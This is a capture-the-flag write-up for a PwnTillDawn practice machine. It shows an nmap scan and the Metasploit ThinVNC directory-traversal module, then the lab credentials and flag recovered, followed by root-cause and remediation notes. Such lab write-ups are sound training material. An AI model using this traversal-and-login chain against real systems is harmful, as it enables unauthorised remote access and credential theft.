# PwnTillDawn Write-up (Machine: 10.150.150.69)

**Target IP:** 10.150.150.69

**Platform:** PwnTillDawn

**Difficulty:** Easy

---

## Overview

This machine demonstrates a misconfiguration in ThinVNC that allows directory traversal and leads to credential disclosure and remote access.

---

## Reconnaissance

Initial scan:

```bash
nmap -sC -sV -O 10.150.150.69
```

### Results

| Port  | Service       | Description             |
| ----- | ------------- | ----------------------- |
| 135   | msrpc         | Microsoft RPC           |
| 139   | netbios-ssn   | SMB                     |
| 3389  | ms-wbt-server | Remote Desktop Protocol |
| 60000 | http          | ThinVNC Web Interface   |

ThinVNC on port 60000 is identified as the primary attack surface.

---

## Enumeration

Accessing the service:

```
http://10.150.150.69:60000
```

A ThinVNC login interface is exposed.

---

## Exploitation

Metasploit module used:

```bash
use auxiliary/scanner/http/thinvnc_traversal
set RHOSTS 10.150.150.69
set RPORT 60000
run
```

The module confirms a directory traversal vulnerability.

---

## Credential Disclosure

The attack reveals the following credentials:

```
Username: desperado
Password: TooComplicatedToGuessMeAhahahahahahahh
```

Credentials are retrieved from exposed configuration files.

---

## Initial Access

Using the recovered credentials to authenticate via the web interface:

```
http://10.150.150.69:60000
```

Remote desktop access is successfully established.

---

## Post-Exploitation

After gaining access, system enumeration reveals user files and application directories. Sensitive data is accessible without restrictions.

---

## Flag

```
2971f3459fe55db1237aad5e0f0a259a41633962
```

---

## Root Cause Analysis

The compromise was possible due to:

* Directory traversal vulnerability in ThinVNC
* Exposure of sensitive files over HTTP
* Insecure credential storage
* Lack of access control on remote management service

---

## Remediation

Recommended actions:

* Disable or restrict ThinVNC access
* Apply security patches and updates
* Enforce proper authentication mechanisms
* Restrict access via firewall or VPN
* Avoid storing credentials in plaintext

---

## Conclusion

This machine highlights the risks associated with misconfigured remote access services. A simple enumeration of high ports led to full compromise through exposed services and weak security practices.


